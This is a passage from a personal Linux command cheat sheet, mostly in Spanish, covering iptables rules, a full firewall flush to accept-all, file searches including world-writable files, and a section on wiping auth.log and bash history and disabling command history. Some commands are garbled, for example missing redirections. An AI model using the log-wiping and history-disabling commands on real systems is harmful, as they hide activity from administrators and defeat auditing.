"Aceptar (ACCEPT) el tráfico entrante (-i) proveniente desde la interfaz eth1 cuando las conexiones se establezcan desde el puerto  (--sport) 67 por protocolos (-p) TCP y UDP."

$ iptables -A INPUT -p udp -s 200.33.146.217/32 --source-port 53 -d 0/0 -j ACCEPT
"Aceptar (ACCEPT) conexiones de tráfico entrante (INPUT) por protocolo (-p) UDP cuando se establezcan desde (-s) el servidor DNS 200.33.145.217 desde el puerto (--source-port) 53 hacia (-d) cualquier destino (0/0):"

$ iptables -A INPUT -p tcp --destination-port 22 -j DROP
$ iptables -A INPUT -p tcp --destination-port 23 -j DROP
"Descartar (DROP) el tráfico entrante (INPUT) para el protocolo (-p) TCP hacia los puerto (--destination-port) de SSH (22) y Telnet (23):"

$ iptables -A INPUT -s a.b.c.d -j DROP
"Descartar (DROP) todo tipo de conexiones de tráfico entrante (INPUT) desde (-s) la dirección IP a.b.c.d:"

$ iptables -A OUTPUT -d a.b.c.d -s 192.168.0.0/24 -j REJECT
"Rechazar (REJECT) conexiones hacia (OUTPUT) la dirección IP a.b.c.d desde la red local:"


$ iptables -L
$ iptables -S TCP
$ iptables -L INPUT
$ iptables -L INPUT -v
$ iptables -Z                    "resetea el conteo de paquetes"
$ iptables -L --line-numbers
$ iptables -D                    "numero de regla" + "chain" Ex. iptables -D 3 INPUT
$ iptables -F "chain"            "flush a single chain"
$ iptables -F                    "flush all chains"


                      FLUSH ALL RULES, DELETE ALL CHAINS AND ACCEPT ALL

"/////////Note: This will effectively disable your firewall. You should only follow this section if you want to start over the configuration of your firewall.////////////////////////"

"First, set the default policies for each of the built-in chains to ACCEPT. The main reason to do this is to ensure that you won't be locked out from your server via SSH:"

$ iptables -P INPUT ACCEPT
$ iptables -P FORWARD ACCEPT
$ iptables -P OUTPUT ACCEPT

"Then flush the nat and mangle tables, flush all chains (-F), and delete all non-default chains (-X):"

$ iptables -t nat -F
$ iptables -t mangle -F
$ iptables -F 
$ iptables -X

"Your firewall will now allow all network traffic. If you list your rules now, you will will see there are none, and only the three default chains (INPUT, FORWARD, and OUTPUT) remain."

«««««««««««««««««««««««««««««««««««««««««««««««««««««««»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»


buscar archivos:

$ find /etc/ -name "issue*"
"busca por nombre"

$ find / -perm 777
"busca por permisos"

$ find / -user root
"busca por usuario"

«««««««««««««««««««««««««««««««««««««««««««««««««««««««««««»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»


history:

$ history | awk '{print $2}' | awk 'BEGIN {FS="|"}{print $1}'  
"ver comandos mas usados"

$ echo "" /var/log/auth.log
"limpiar auth log"

$ echo "" ~/.bash_history -rf
"limpiar bash history"

$ history -c
"limpiar history sesion reciente"

$ export HISTSIZE=0
"configura en 0 el maximo de history lines"

$ unset HISTFILE
"deshabilitar history- desloguearse despues

$ kill -9 $$
"kill current session"

$ ln /dev/null ~/.bash_history -sf
"envia todos los comandos de history a /dev/null"

$ history | tail -50
"ultimos 50 comandos"


«««««««««««««««««««««««««««««««««««««««««««««««««««««««««««»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»

referencias:

-_-     mega.z



